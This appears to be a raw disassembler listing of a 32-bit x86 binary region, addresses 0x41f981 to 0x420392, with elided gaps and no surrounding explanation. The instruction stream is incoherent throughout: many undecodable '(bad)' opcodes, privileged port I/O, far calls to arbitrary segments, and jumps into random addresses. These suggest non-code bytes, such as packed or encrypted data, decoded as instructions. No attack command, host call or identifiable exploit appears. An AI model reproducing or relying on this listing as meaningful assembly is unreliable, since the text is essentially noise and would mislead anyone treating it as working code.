  41f981:	mov    ebx,0x5848a317
  41f986:	scas   eax,DWORD PTR es:[edi]
  41f987:	xchg   BYTE PTR [ebp+0x8],bh
  41f98a:	jnp    0x41f9e9
  41f98c:	push   esi
  41f98d:	inc    esi
  41f98e:	adc    ebx,DWORD PTR [ebx-0x382bde31]
  41f994:	lock (bad) 
  41f997:	pop    esp
  41f998:	fs iret 
  41f99a:	push   ebp
  41f99b:	jle    0x41f974
  41f99d:	cwde   
  41f99e:	cmp    bh,BYTE PTR [esi+edi*4-0xa]
  41f9a2:	or     BYTE PTR [esi+edi*4+0x34d436ee],dh
  41f9a9:	xor    al,0x2e
  41f9ab:	pop    ebp
  41f9ac:	adc    BYTE PTR [eax+0xd4597ca],al
  41f9b2:	test   DWORD PTR [edx-0x9379473],ebp
  41f9b8:	push   esp
  41f9b9:	or     al,0xda
  41f9bb:	jbe    0x41f9bd
  41f9bd:	and    DWORD PTR [ebx+ecx*8-0x6f],esp
  41f9c1:	fstp   st(7)
  41f9c3:	int3   
  41f9c4:	(bad)  ds:0x4b51f3a6
  41f9ca:	and    al,0x37
  41f9cc:	outs   dx,BYTE PTR ds:[esi]
  41f9cd:	das    
  41f9ce:	or     eax,0xa7e0cad6
  41f9d3:	aas    
  41f9d4:	pop    ss
  41f9d5:	dec    ecx
  41f9d6:	sbb    DWORD PTR [ebp+0x42],edx
  41f9d9:	push   0x9ad33d83
  41f9de:	dec    edi
  41f9df:	jmp    0x8cfc42df
  41f9e4:	jmp    0x41fa61
  41f9e6:	xchg   edi,eax
  41f9e7:	std    
  41f9e8:	std    
  41f9e9:	scas   al,BYTE PTR es:[edi]
  41f9ea:	adc    BYTE PTR [edx+0x66],al
  41f9ed:	ins    BYTE PTR es:[edi],dx
  41f9ee:	mov    ah,0x99
  41f9f0:	push   0x95b4eb6b
  41f9f5:	pop    ds
  41f9f6:	sti    
  41f9f7:	addr16 sti 
  41f9f9:	in     al,0x6f
  41f9fb:	jg     0x41fa46
  41f9fd:	mov    dl,0xaf
  41f9ff:	ror    BYTE PTR [ebx+eiz*4+0x42],1
  41fa03:	ds and al,0xc7
  41fa06:	outs   dx,BYTE PTR ds:[esi]
  41fa07:	shr    DWORD PTR fs:0xc850bb8d,1
  41fa0e:	idiv   BYTE PTR [esi+0x0]
	...
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0x8811b01f
  41fa84:	rcl    BYTE PTR [eax+0x1],1
  41fa87:	add    BYTE PTR [ecx+eax*1],al
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	repz and al,0xb6
  41fa8f:	cld    
  41fa90:	xor    BYTE PTR [esp+ebx*1],ah
  41fa93:	mov    al,0x4b
  41fa95:	or     eax,0x6037850b
  41fa9a:	and    esi,DWORD PTR [eax]
  41fa9c:	add    ch,BYTE PTR fs:[eax+0x7da18c9b]
  41faa3:	jle    0x41fade
  41faa5:	jle    0x41faf5
  41faa7:	js     0x41fa85
  41faa9:	and    DWORD PTR [eax],ebx
  41faab:	xor    al,0xb3
  41faad:	test   eax,0xd5a8185e
  41fab2:	adc    DWORD PTR [ebp-0x44],ecx
  41fab5:	das    
  41fab6:	pop    ebx
  41fab7:	jg     0x41fa42
  41fab9:	jno    0x41fa81
  41fabb:	scas   eax,DWORD PTR es:[edi]
  41fabc:	inc    ebp
  41fabe:	adc    eax,0xeaecbe0c
  41fac3:	adc    esp,edi
  41fac5:	jmp    0x680b4fcb
  41faca:	push   0xffffffb4
  41facc:	push   ebp
  41facd:	stos   BYTE PTR es:[edi],al
  41face:	pop    ecx
  41facf:	inc    ebx
  41fad0:	fstp   st(6)
  41fad2:	aad    0x57
  41fad4:	loop   0x41fb28
  41fad6:	jp     0x41fb0d
  41fad8:	pop    ebp
  41fad9:	dec    edx
  41fada:	dec    eax
  41fadb:	inc    ebx
  41fadc:	not    BYTE PTR [eax-0x12c8d244]
  41fae2:	cld    
  41fae3:	xor    bl,bl
  41fae5:	cs leave 
  41fae7:	rcl    DWORD PTR cs:[edx+0x7f],1
  41faeb:	add    eax,0xf881469f
  41faf0:	xor    DWORD PTR [ebp+0x3d0659da],ebp
  41faf6:	out    0x6a,al
  41faf8:	cmp    BYTE PTR [ecx+ebp*2],0xf
  41fafc:	adc    BYTE PTR [edi-0x7d],dl
  41faff:	cld    
  41fb00:	leave  
  41fb01:	jo     0x41fb10
  41fb03:	push   cs
  41fb04:	arpl   di,di
  41fb06:	call   0xf135:0xda8eb983
  41fb0d:	shr    BYTE PTR [ebx],1
  41fb0f:	xor    al,0x31
  41fb11:	ds mov esi,ebp
  41fb14:	adc    ch,dl
  41fb16:	or     ecx,DWORD PTR [ebx-0x3a]
  41fb19:	jb     0x41faae
  41fb1b:	lods   eax,DWORD PTR ds:[esi]
  41fb1c:	mov    al,ds:0x127c198c
  41fb21:	lea    edi,[ebx]
  41fb23:	add    al,0x67
  41fb25:	leave  
  41fb26:	jle    0x41fada
  41fb28:	mov    ebx,0x2050a5ba
  41fb2d:	gs (bad) 
  41fb2f:	retf   0xbc18
  41fb32:	pushf  
  41fb33:	imul   edx,DWORD PTR [ecx+esi*4],0x33547cc8
  41fb3a:	xor    dl,bl
  41fb3c:	xor    dl,BYTE PTR [esi+edx*2+0x3f04871]
  41fb43:	pushf  
  41fb44:	icebp  
  41fb45:	sbb    al,0x17
  41fb47:	nop
  41fb48:	fs out dx,al
  41fb4a:	cmp    ebp,esi
  41fb4c:	gs nop
  41fb4e:	push   ecx
  41fb4f:	dec    edi
  41fb50:	mov    ecx,DWORD PTR [ecx+0x8]
  41fb53:	jne    0x41fae4
  41fb55:	and    eax,0xdcb35027
  41fb5a:	into   
  41fb5b:	cmp    esi,DWORD PTR [edx-0xf]
  41fb5e:	in     al,dx
  41fb5f:	imul   eax,DWORD PTR [ecx+0x3a],0xffffff88
  41fb63:	test   al,0xf8
  41fb65:	jb     0x41fb3c
  41fb67:	out    dx,eax
  41fb68:	push   ds
  41fb69:	push   ebp
  41fb6a:	fcomp  QWORD PTR [ebx]
  41fb6c:	and    BYTE PTR [eax+0x17533061],al
  41fb72:	addr16 sub al,0xcb
  41fb75:	es stc 
  41fb77:	aam    0x32
  41fb79:	(bad)  
  41fb7a:	int3   
  41fb7b:	daa    
  41fb7c:	xor    dh,ch
  41fb7e:	mov    ch,0x4b
  41fb80:	cld    
  41fb81:	adc    eax,0xf9161bf
  41fb86:	inc    edx
  41fb87:	mov    DWORD PTR [ebx],eax
  41fb89:	fdiv   DWORD PTR [edi+0x67daaa8c]
  41fb8f:	add    eax,DWORD PTR [eax]
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	lahf   
  41fc01:	xchg   edx,eax
  41fc02:	out    0x3,eax
  41fc04:	aam    0x51
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	(bad)  
  41fc0d:	int3   
  41fc0e:	imul   edi,DWORD PTR [esp+edx*1],0xffffff9d
  41fc12:	lock ret 0x1aa2
  41fc16:	mov    bl,0xce
  41fc18:	jg     0x41fbab
  41fc1a:	sbb    cl,BYTE PTR [esi+eiz*1-0x31575a5c]
  41fc21:	loopne 0x41fc06
  41fc23:	icebp  
  41fc24:	mov    dh,0xde
  41fc26:	imul   ecx,DWORD PTR ds:0x3c6ffa5c,0x6dafcb56
  41fc30:	mov    esi,0xb071843
  41fc35:	or     BYTE PTR [esi+0xeac1a50],dl
  41fc3b:	rol    BYTE PTR [esi-0x1a36cb90],0x43
  41fc42:	loop   0x41fbe2
  41fc44:	jp     0x41fbf7
  41fc46:	adc    BYTE PTR [ecx],dh
  41fc48:	inc    ebp
  41fc49:	push   0x71955780
  41fc4e:	int    0xbf
  41fc50:	shl    DWORD PTR ds:0x94f05f03,1
  41fc56:	out    0xeb,al
  41fc58:	mov    ds:0xb618e1bc,eax
  41fc5d:	(bad)  
  41fc5f:	icebp  
  41fc60:	mov    cl,0x41
  41fc62:	sbb    esi,DWORD PTR [eax]
  41fc64:	and    eax,0x70e06f74
  41fc69:	out    dx,al
  41fc6a:	in     al,dx
  41fc6b:	cwde   
  41fc6c:	jmp    0x41fbf9
  41fc6e:	and    bl,BYTE PTR [ecx+0x65]
  41fc71:	call   0x56ae:0xb71d1166
  41fc78:	dec    ecx
  41fc79:	mov    eax,ds:0x98a38810
  41fc7e:	cs jl  0x41fcd2
  41fc81:	and    al,0xf9
  41fc83:	or     esp,esp
  41fc85:	xchg   ebp,eax
  41fc86:	mov    bl,0xf6
  41fc88:	out    dx,al
  41fc89:	add    bl,ch
  41fc8b:	mov    eax,ds:0xcd2b7dbe
  41fc90:	jnp    0x41fcd1
  41fc92:	(bad)  
  41fc93:	repnz ins BYTE PTR es:[edi],dx
  41fc95:	adc    DWORD PTR [edi-0x65ab8732],edi
  41fc9b:	add    DWORD PTR [ecx],edx
  41fc9d:	adc    eax,0xea80248d
  41fca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fca3:	scas   al,BYTE PTR es:[edi]
  41fca4:	xor    esi,esi
  41fca6:	and    BYTE PTR [esi],ch
  41fca8:	stos   DWORD PTR es:[edi],eax
  41fca9:	jg     0x41fcdb
  41fcab:	and    BYTE PTR [edx+0x2c],dh
  41fcae:	xor    ch,BYTE PTR [ebx+0x680a43cd]
  41fcb4:	inc    edi
  41fcb5:	scas   al,BYTE PTR es:[edi]
  41fcb6:	ds out dx,al
  41fcb8:	xchg   ebx,eax
  41fcb9:	out    dx,al
  41fcba:	add    al,0x68
  41fcbc:	aad    0xdb
  41fcbe:	in     eax,dx
  41fcbf:	adc    ch,ah
  41fcc1:	mov    WORD PTR [ebx+0x25a92629],ss
  41fcc7:	xchg   BYTE PTR [esp+ecx*1+0x69],bl
  41fccb:	cdq    
  41fccc:	dec    ebx
  41fccd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcce:	lea    esi,[ebx-0x1d04d24a]
  41fcd4:	(bad)  
  41fcd6:	push   ds
  41fcd7:	and    eax,0x91331140
  41fcdc:	daa    
  41fcdd:	ds pop esp
  41fcdf:	fiadd  WORD PTR [edi]
  41fce1:	xor    eax,edi
  41fce3:	inc    ecx
  41fce4:	into   
  41fce5:	loopne 0x41fc7a
  41fce7:	push   0x1a
  41fce9:	mov    edi,0x6b9ba2ce
  41fcee:	jg     0x41fd2b
  41fcf0:	xor    bh,BYTE PTR [ebp+ebp*4-0x18277937]
  41fcf7:	push   edi
  41fcf8:	loopne 0x41fc9e
  41fcfa:	scas   al,BYTE PTR es:[edi]
  41fcfb:	pop    edi
  41fcfc:	xchg   ebp,eax
  41fcfd:	or     eax,0x6b51a966
  41fd02:	lea    ecx,[edx+0x19149ef6]
  41fd08:	out    dx,al
  41fd09:	mov    eax,ds:0x82c277f6
  41fd0e:	div    BYTE PTR [ecx]
	...
  41fd74:	or     al,0x6a
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	push   eax
  41fd81:	adc    ecx,DWORD PTR [ebx+0x2]
  41fd84:	fcom   DWORD PTR [edx+0x1]
  41fd87:	add    BYTE PTR [ecx+eax*1],al
  41fd8a:	add    BYTE PTR [eax],al
  41fd8c:	jns    0x41fdb1
  41fd8e:	clc    
  41fd8f:	fdiv   DWORD PTR [ebx*1+0x79d0730]
  41fd96:	daa    
  41fd97:	rcr    BYTE PTR [eax+0x5e],1
  41fd9a:	addr16 mov eax,fs
  41fd9d:	frndint 
  41fd9f:	or     ebp,DWORD PTR ds:0x495e46ff
  41fda5:	add    DWORD PTR [edx-0xe],ebp
  41fda8:	add    BYTE PTR [ecx-0x16],cl
  41fdab:	adc    al,0x68
  41fdad:	out    dx,eax
  41fdae:	lahf   
  41fdaf:	scas   al,BYTE PTR es:[edi]
  41fdb0:	mov    edi,0x46e52a94
  41fdb5:	cwde   
  41fdb6:	es ret 
  41fdb8:	(bad)
  41fdbc:	xchg   esp,eax
  41fdbd:	je     0x41fd86
  41fdbf:	xchg   BYTE PTR [ebx-0x1da7706b],ch
  41fdc5:	in     al,dx
  41fdc6:	adc    bh,BYTE PTR [edx+edi*4-0x31]
  41fdca:	daa    
  41fdcb:	or     eax,0xce6fabac
  41fdd0:	adc    ebx,DWORD PTR [ecx]
  41fdd2:	inc    edi
  41fdd3:	mov    bh,0x7c
  41fdd5:	sub    ebx,DWORD PTR [ecx+0x5d]
  41fdd8:	lock adc eax,0xe4a4d96e
  41fdde:	fnsave ds:0x2e076b99
  41fde4:	ja     0x41fe56
  41fde6:	out    dx,al
  41fde7:	inc    eax
  41fde8:	dec    esi
  41fde9:	ins    BYTE PTR es:[edi],dx
  41fdea:	repnz push ecx
  41fdec:	test   BYTE PTR [esi],al
  41fdee:	mov    eax,0x14d06da4
  41fdf3:	sti    
  41fdf4:	adc    eax,0xe70fae53
  41fdf9:	ja     0x41fdbf
  41fdfb:	stos   BYTE PTR es:[edi],al
  41fdfc:	push   cs
  41fdfd:	xchg   edx,eax
  41fdfe:	inc    edx
  41fdff:	ret    
  41fe00:	ret    
  41fe01:	pop    ebx
  41fe02:	daa    
  41fe03:	dec    ecx
  41fe04:	es pop edx
  41fe06:	sub    al,0x40
  41fe08:	loop   0x41fe48
  41fe0a:	and    BYTE PTR [eax+0x6c],dl
  41fe0d:	cmc    
  41fe0e:	sbb    BYTE PTR [ebx-0x12a5e7f2],ch
  41fe14:	mov    BYTE PTR [esi],bl
  41fe16:	inc    eax
  41fe17:	adc    BYTE PTR [esi+0x49ccebd0],al
  41fe1d:	lahf   
  41fe1e:	push   es
  41fe1f:	lds    ebx,FWORD PTR [edi]
  41fe21:	xchg   edx,eax
  41fe22:	iret   
  41fe23:	pop    edx
  41fe24:	into   
  41fe25:	pop    ss
  41fe26:	push   eax
  41fe27:	or     bl,ah
  41fe29:	xor    DWORD PTR [eax+0xbb5151c],esp
  41fe2f:	push   ss
  41fe30:	(bad)  [ebx-0x37]
  41fe33:	xchg   DWORD PTR [esp+esi*1-0x7ebaefe],eax
  41fe3a:	mov    edi,fs
  41fe3c:	inc    edx
  41fe3d:	xor    dl,BYTE PTR [edi-0x42]
  41fe40:	or     bl,ah
  41fe42:	fwait
  41fe43:	dec    esi
  41fe44:	mov    edi,0x9fd9e69a
  41fe49:	xor    DWORD PTR [edx+0x2557c6e7],esi
  41fe4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe50:	jp     0x41fe4b
  41fe52:	inc    esp
  41fe53:	data16 hlt 
  41fe55:	call   0xb8cd2f15
  41fe5a:	stc    
  41fe5b:	and    eax,0xda3eb96a
  41fe60:	add    dl,BYTE PTR [esi-0x75]
  41fe63:	das    
  41fe64:	xor    esp,DWORD PTR [eax-0x17b5c58e]
  41fe6a:	pop    edx
  41fe6b:	pop    ebp
  41fe6c:	pusha  
  41fe6d:	cld    
  41fe6e:	mov    esi,0x1eebbb15
  41fe73:	cmc    
  41fe74:	xor    DWORD PTR [ebp+0x75],edx
  41fe77:	imul   ecx,edx,0x7e132cf0
  41fe7d:	imul   ecx,ebp,0xc1674e46
  41fe83:	and    BYTE PTR [ebp-0x58],bh
  41fe86:	jle    0x41fe9f
  41fe88:	rcr    DWORD PTR [eax+0x70],cl
  41fe8b:	add    BYTE PTR [esi-0x66],ch
  41fe8e:	stos   BYTE PTR es:[edi],al
  41fe8f:	push   ecx
	...
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0xe4
  41ff01:	mov    ebx,0x53dce2f4
  41ff06:	add    DWORD PTR [eax],eax
  41ff08:	add    al,0x1
  41ff0a:	add    BYTE PTR [eax],al
  41ff0c:	xchg   DWORD PTR [ebx+edi*4],ebx
  41ff0f:	jmp    0x41ff50
  41ff11:	aaa    
  41ff12:	inc    ebp
  41ff13:	in     eax,dx
  41ff14:	leave  
  41ff15:	pushf  
  41ff16:	js     0x41feca
  41ff18:	scas   eax,DWORD PTR es:[edi]
  41ff19:	push   cs
  41ff1a:	mov    al,0xfd
  41ff1c:	mov    dh,0xfe
  41ff1e:	xor    bh,bl
  41ff20:	inc    ecx
  41ff21:	fidivr DWORD PTR [edx-0x21]
  41ff24:	adc    eax,0xf4bbebf2
  41ff29:	in     al,0xa6
  41ff2b:	outs   dx,DWORD PTR ds:[esi]
  41ff2c:	test   al,0xb2
  41ff2e:	cwde   
  41ff2f:	js     0x41feee
  41ff31:	cmp    BYTE PTR ds:0x4f4a6f33,0x58
  41ff38:	sbb    bh,bh
  41ff3a:	inc    edi
  41ff3b:	pop    edx
  41ff3c:	test   bl,ah
  41ff3e:	jb     0x41fed3
  41ff40:	sub    BYTE PTR [eiz*2-0x4f2bcbc],cl
  41ff47:	cmc    
  41ff48:	mov    esi,0x703bc2
  41ff4d:	push   es
  41ff4e:	mov    ebp,0xc2104a0b
  41ff53:	add    eax,0xa9c0d9b4
  41ff58:	xor    edx,DWORD PTR [eax-0x660d8eef]
  41ff5e:	mov    bl,0x18
  41ff60:	mov    ds:0x85afa375,eax
  41ff65:	pop    eax
  41ff66:	push   ebp
  41ff67:	xchg   BYTE PTR ds:0x2f401cfe,cl
  41ff6d:	loopne 0x41ff8d
  41ff6f:	pop    ebp
  41ff70:	in     eax,dx
  41ff71:	jb     0x41ff02
  41ff73:	or     DWORD PTR [ebx-0x26358d55],ebp
  41ff79:	mov    ecx,DWORD PTR [eax-0x2331edbd]
  41ff7f:	es or  esp,ecx
  41ff82:	shl    BYTE PTR [edi-0x73],0xe6
  41ff86:	or     ecx,ebx
  41ff88:	inc    esi
  41ff89:	(bad)  
  41ff8a:	sub    al,0x25
  41ff8c:	push   ebx
  41ff8d:	aas    
  41ff8e:	inc    edi
  41ff8f:	test   bl,bh
  41ff91:	cs mov dl,0x1c
  41ff94:	loop   0x41ff3e
  41ff96:	fst    DWORD PTR [ecx]
  41ff98:	scas   al,BYTE PTR es:[edi]
  41ff99:	lods   al,BYTE PTR ds:[esi]
  41ff9a:	loop   0x41ff68
  41ff9c:	pop    ss
  41ff9d:	cdq    
  41ff9e:	call   0xe0f8e20
  41ffa3:	pusha  
  41ffa4:	in     eax,dx
  41ffa5:	clc    
  41ffa6:	pop    eax
  41ffa7:	push   edx
  41ffa8:	adc    cl,cl
  41ffaa:	add    eax,0xdac285e
  41ffaf:	push   esp
  41ffb0:	call   0x184f:0x277bcc6
  41ffb7:	popf   
  41ffb8:	or     DWORD PTR ds:0x808619e6,0x514f71e0
  41ffc2:	(bad)  [edx+0x34]
  41ffc5:	outs   dx,DWORD PTR ds:[esi]
  41ffc6:	mov    eax,ds:0xba03848a
  41ffcb:	stc    
  41ffcc:	adc    BYTE PTR [ebp+edx*8-0x5abbe014],ah
  41ffd3:	push   0x750e6e77
  41ffd8:	outs   dx,DWORD PTR gs:[esi]
  41ffda:	jo     0x420014
  41ffdc:	or     edx,esp
  41ffde:	neg    DWORD PTR [edx]
  41ffe0:	jge    0x41ffe7
  41ffe2:	add    al,0xf8
  41ffe4:	aam    0xfe
  41ffe6:	iret   
  41ffe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffe8:	and    eax,0x75c5bb81
  41ffed:	pop    ecx
  41ffee:	mov    ch,0x90
  41fff0:	jnp    0x420070
  41fff2:	xchg   esi,eax
  41fff3:	mov    al,ds:0xb2ee6480
  41fff8:	inc    esp
  41fff9:	cld    
  41fffa:	nop
  41fffb:	retf   
  41fffc:	add    eax,0xbfb30e71
  420001:	ins    DWORD PTR es:[edi],dx
  420002:	and    DWORD PTR [ebx-0x54],esi
  420005:	mov    edi,0x5f07411a
  42000a:	imul   eax,DWORD PTR [edi-0x4d],0x247ad8
	...
  420071:	add    BYTE PTR [eax],al
  420073:	add    BYTE PTR [edx-0x5b],ah
  420076:	jbe    0x4200f7
  420078:	idiv   edi
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffff89
  420081:	inc    esi
  420082:	pop    edi
  420083:	fchs   
  420085:	push   esp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    al,0x1
  42008a:	add    BYTE PTR [eax],al
  42008c:	into   
  42008d:	mov    ds:0xa08d07a8,al
  420092:	aam    0x6a
  420094:	inc    edi
  420095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420096:	and    DWORD PTR [edx],edi
  420098:	mov    edi,0xf401a16b
  42009d:	xor    bl,cl
  42009f:	ds push ebp
  4200a1:	or     al,0x72
  4200a3:	dec    ecx
  4200a4:	mov    cl,0x5
  4200a6:	mov    ecx,0xa671447d
  4200ab:	lds    esi,FWORD PTR [ecx-0x4c]
  4200ae:	sahf   
  4200af:	test   al,0x46
  4200b1:	in     eax,0x43
  4200b3:	cmp    bl,dh
  4200b5:	mov    edi,0x255d4358
  4200ba:	outs   dx,BYTE PTR ds:[esi]
  4200bb:	stos   DWORD PTR es:[edi],eax
  4200bc:	cmp    eax,0xfce40f05
  4200c1:	push   edx
  4200c2:	inc    esp
  4200c3:	fcom   QWORD PTR [eax-0xd6d8877]
  4200c9:	inc    DWORD PTR [esi+0x45]
  4200cc:	icebp  
  4200cd:	jne    0x4200ff
  4200cf:	retf   
  4200d0:	mov    bl,0x7b
  4200d2:	cs sub eax,0x8d3220dc
  4200d8:	retf   
  4200d9:	cmp    DWORD PTR [esi+0x7],edx
  4200dc:	mov    dl,0x70
  4200de:	inc    ecx
  4200df:	xchg   esp,eax
  4200e0:	add    al,0x3a
  4200e2:	icebp  
  4200e3:	jmp    0x420111
  4200e5:	xchg   esp,eax
  4200e6:	cmp    al,0x6d
  4200e8:	or     al,0x1
  4200ea:	dec    ebx
  4200eb:	js     0x420141
  4200ed:	fwait
  4200ee:	xor    edx,DWORD PTR [ebx]
  4200f0:	or     al,0x5f
  4200f2:	(bad)  
  4200f3:	fisttp DWORD PTR [ebx]
  4200f5:	mov    cl,0xaf
  4200f7:	sbb    BYTE PTR [edi+0x2d],al
  4200fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200fb:	rcr    BYTE PTR [eax+ecx*1-0x64af74e5],cl
  420102:	loope  0x4200f8
  420104:	fwait
  420105:	xchg   edx,eax
  420106:	cdq    
  420107:	sub    BYTE PTR [ebx],0x93
  42010a:	shl    DWORD PTR [eax-0x2e],0xb3
  42010e:	cmp    bh,BYTE PTR [edx+0x5eaef2ca]
  420114:	in     eax,dx
  420115:	push   es
  420116:	xor    eax,0x359a66e2
  42011b:	push   eax
  42011c:	fdiv   st,st(3)
  42011e:	in     al,0xf8
  420120:	pushf  
  420121:	inc    edx
  420122:	jecxz  0x42016e
  420124:	inc    edi
  420125:	push   edx
  420126:	sbb    al,BYTE PTR [edi-0x60]
  420129:	mov    dl,0xb6
  42012b:	jae    0x4201a3
  42012d:	aam    0xe9
  42012f:	aas    
  420130:	rol    BYTE PTR [ecx-0x12],0x63
  420134:	pop    ds
  420135:	xor    eax,DWORD PTR [ebp+0xb]
  420138:	xor    eax,DWORD PTR [ebp-0x72a81773]
  42013e:	lahf   
  42013f:	sub    eax,DWORD PTR [ebx+0x35]
  420142:	cwde   
  420143:	int3   
  420144:	imul   eax,DWORD PTR [edx+ebp*2+0x2e3d5b9d],0x1a22ee45
  42014f:	push   cs
  420150:	rep ins BYTE PTR es:[edi],dx
  420152:	push   edi
  420153:	dec    DWORD PTR [esi]
  420155:	mov    ecx,0xa20599d7
  42015a:	lea    esp,[ecx+eiz*4-0x53]
  42015e:	mov    DWORD PTR [esp+edx*4+0x36491cad],0xa65745d3
  420169:	push   eax
  42016a:	pop    ebp
  42016b:	fisttp QWORD PTR [ecx+ebx*8]
  42016e:	gs mov ah,0xc0
  420171:	fwait
  420172:	bound  ebp,QWORD PTR [ebp+0x75a9765a]
  420178:	push   edi
  420179:	mov    ds:0xacb753ab,al
  42017e:	hlt    
  42017f:	dec    ecx
  420180:	sbb    bl,BYTE PTR [edi]
  420182:	shl    DWORD PTR [ebx-0x23],0x42
  420186:	dec    ebp
  420187:	cld    
  420188:	or     ebx,DWORD PTR [ecx]
  42018a:	or     al,0xfc
  42018c:	push   ebx
  42018d:	mov    al,0x28
  42018f:	aad    0x0
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x242ab70d],1
  420204:	in     al,0x55
  420206:	add    DWORD PTR [eax],eax
  420208:	add    al,0x1
  42020a:	add    BYTE PTR [eax],al
  42020c:	ss out 0x3,eax
  42020f:	rcr    DWORD PTR [eax-0x6988354d],1
  420215:	into   
  420216:	xchg   edi,eax
  420217:	(bad)  
  42021a:	loope  0x42026e
  42021c:	inc    ebp
  42021d:	stos   DWORD PTR es:[edi],eax
  42021e:	pop    ebp
  42021f:	leave  
  420220:	jmp    0xad03:0x5fbf522b
  420227:	ror    ch,cl
  420229:	inc    edi
  42022a:	push   eax
  42022b:	dec    esp
  42022c:	dec    ecx
  42022d:	imul   edx,DWORD PTR [esi-0x31],0x162030c1
  420234:	xor    BYTE PTR [ebp+0x352893d0],dh
  42023a:	jb     0x420266
  42023c:	aam    0xa4
  42023e:	jno    0x420270
  420240:	add    BYTE PTR [edi+0x24ed46f],bh
  420246:	xor    eax,0xc53155f2
  42024b:	das    
  42024c:	leave  
  42024d:	pop    es
  42024e:	lea    ebx,[ebx+ebp*4]
  420251:	sbb    BYTE PTR [edi-0xc],ch
  420254:	in     al,dx
  420255:	mov    cl,0xf7
  420257:	dec    ebx
  420258:	sbb    edx,DWORD PTR [eax-0x10]
  42025b:	sbb    eax,0x2c553633
  420260:	out    dx,eax
  420261:	dec    esp
  420262:	outs   dx,BYTE PTR ds:[esi]
  420263:	jecxz  0x42024a
  420265:	dec    ecx
  420266:	adc    ah,BYTE PTR [eax+0x69]
  420269:	rcl    BYTE PTR [ebx],1
  42026b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42026c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42026d:	jl     0x42028d
  42026f:	sub    al,0x6f
  420271:	ins    DWORD PTR es:[edi],dx
  420272:	sar    DWORD PTR [ebx],0x13
  420275:	or     eax,0xe4e7480d
  42027a:	test   DWORD PTR [edi+eiz*2-0x38],0xc128fb69
  420282:	or     eax,0x39201c58
  420287:	dec    eax
  420288:	das    
  420289:	cmp    al,0xfb
  42028b:	stos   BYTE PTR es:[edi],al
  42028c:	repnz mov bh,0x4f
  42028f:	mov    esp,0x100a5668
  420294:	and    al,0x7e
  420296:	lahf   
  420297:	inc    edi
  420298:	sbb    dl,BYTE PTR [esp+ebx*2-0x4d3f811b]
  42029f:	xchg   BYTE PTR [eax-0x4f],bl
  4202a2:	into   
  4202a3:	in     eax,dx
  4202a4:	call   0xf02e:0x50580882
  4202ab:	pop    esi
  4202ac:	sub    bl,BYTE PTR ds:0x974261dc
  4202b2:	mov    al,0xe2
  4202b4:	pop    ss
  4202b5:	mov    eax,0xf13969f9
  4202ba:	cmp    ecx,DWORD PTR [ebx+0x27]
  4202bd:	pusha  
  4202be:	sti    
  4202bf:	jns    0x42024e
  4202c1:	xchg   ebp,eax
  4202c2:	stos   DWORD PTR es:[edi],eax
  4202c3:	cmp    edx,DWORD PTR [ebx]
  4202c5:	mov    cl,0xe3
  4202c7:	adc    al,0x56
  4202c9:	sub    al,0x94
  4202cb:	jae    0x420302
  4202cd:	fstp   st(4)
  4202cf:	je     0x4202c2
  4202d1:	xchg   edi,eax
  4202d2:	xor    BYTE PTR [edi+esi*8+0x60],dh
  4202d6:	sbb    esi,esp
  4202d8:	add    BYTE PTR [edi],dh
  4202da:	dec    esp
  4202db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202dc:	fiadd  DWORD PTR [ebx-0x3d]
  4202df:	pusha  
  4202e0:	ins    BYTE PTR es:[edi],dx
  4202e1:	sub    eax,0xafbec787
  4202e6:	inc    edx
  4202e7:	repnz in eax,dx
  4202e9:	mov    bl,0x3d
  4202eb:	aas    
  4202ec:	in     eax,dx
  4202ed:	sub    ebp,eax
  4202ef:	push   ecx
  4202f0:	jg     0x420281
  4202f2:	into   
  4202f3:	shl    BYTE PTR [eax-0x67],1
  4202f6:	cwde   
  4202f7:	clc    
  4202f8:	dec    ecx
  4202f9:	ja     0x4202ed
  4202fb:	ret    0x5a56
  4202fe:	ficom  DWORD PTR [edx+0x2c]
  420301:	dec    ebp
  420302:	push   ebx
  420303:	sbb    eax,0x3e044554
  420308:	dec    edi
  420309:	jg     0x4202ed
  42030b:	rcl    bl,0x2
  42030e:	sub    DWORD PTR [eax+0x0],eax
	...
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	xor    eax,edx
  420382:	das    
  420383:	inc    edi
  420384:	call   0x44204df
  420389:	add    DWORD PTR [eax],eax
  42038b:	add    BYTE PTR [ebx],bl
  42038d:	mov    edx,0xaf058524
  420392:	mov    ds:0x60f94d49,al
